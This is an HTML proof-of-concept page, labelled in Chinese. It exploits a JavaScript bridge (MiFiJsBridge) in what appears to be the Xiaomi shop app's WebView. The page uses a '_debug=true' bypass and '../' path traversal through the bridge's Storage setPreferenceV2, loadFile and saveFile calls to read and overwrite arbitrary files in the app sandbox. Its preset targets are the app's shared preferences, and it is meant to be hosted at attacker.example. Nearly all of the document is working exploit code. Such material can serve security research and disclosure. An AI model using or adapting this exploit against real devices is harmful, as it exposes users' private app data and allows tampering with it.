<!doctype html>
<html lang="zh-CN">
<head>
  <meta charset="utf-8" />
  <title>MiFiJsBridge Storage PoC</title>
  <style>
    body { font-family: sans-serif; padding: 12px; }
    textarea { width: 100%; height: 180px; }
    input { width: 100%; }
    button { margin: 6px 0; }
    pre { white-space: pre-wrap; word-break: break-all; background: #f5f5f5; padding: 8px; }
  </style>
</head>
<body>
  <h3>Storage 任意沙盒文件读写 PoC</h3>
  <p>当前页面 URL 需要带 <code>_debug=true</code>，例如：<code>https://attacker.example/poc_storage_readwrite.html?_debug=true</code></p>

  <label>目标读取路径（相对 filesDir，可用 ../ 穿越）</label>
  <input id="readPath" value="../shared_prefs/com.xiaomi.shop_preferences.xml" />
  <button onclick="readArbitrary()">读取文件</button>

  <label>目标覆盖路径（相对 filesDir，可用 ../ 穿越）</label>
  <input id="writePath" value="../shared_prefs/pwn_test.xml" />
  <label>覆盖内容</label>
  <textarea id="writeData"><map><string name="pwn">1</string></map></textarea>
  <button onclick="overwriteArbitrary()">覆盖文件</button>

  <h4>输出</h4>
  <pre id="out"></pre>

  <script>
    function log(x) {
      const el = document.getElementById("out");
      el.textContent += (typeof x === "string" ? x : JSON.stringify(x, null, 2)) + "\n";
    }

    function invoke(feature, action, param) {
      const raw = window.MiFiJsBridge.invoke(feature, action, param, null);
      try { return JSON.parse(raw); } catch (_) { return { raw }; }
    }

    function lookup(feature, action) {
      return window.MiFiJsBridge.lookup(feature, action);
    }

    function ensureBridge() {
      if (!window.MiFiJsBridge) {
        throw new Error("MiFiJsBridge 不存在（页面未在目标 WebView 中打开）");
      }
      const l1 = lookup("Storage", "setPreferenceV2");
      const l2 = lookup("Storage", "loadFile");
      const l3 = lookup("Storage", "saveFile");
      log({ lookup: { setPreferenceV2: l1, loadFile: l2, saveFile: l3 } });
      if (l1 !== 0 || l2 !== 0 || l3 !== 0) {
        throw new Error("Storage 功能不可用（可能未命中 _debug=true 旁路）");
      }
    }

    function readArbitrary() {
      try {
        ensureBridge();
        const p = document.getElementById("readPath").value;
        const meta = JSON.stringify({ format: 0, authorities: ["*"] });
        const p1 = JSON.stringify({ pref: "hybrid_storage", content: { [p]: meta } });
        const r1 = invoke("Storage", "setPreferenceV2", p1);
        log({ setPreferenceV2: r1 });
        const r2 = invoke("Storage", "loadFile", p);
        log({ loadFile: r2 });
      } catch (e) {
        log("ERR: " + e.message);
      }
    }

    function overwriteArbitrary() {
      try {
        ensureBridge();
        const p = document.getElementById("writePath").value;
        const d = document.getElementById("writeData").value;
        const req = JSON.stringify({
          name: p,
          data: d,
          format: 0,
          authorities: ["*"]
        });
        const r = invoke("Storage", "saveFile", req);
        log({ saveFile: r });
      } catch (e) {
        log("ERR: " + e.message);
      }
    }
  </script>
</body>
</html>
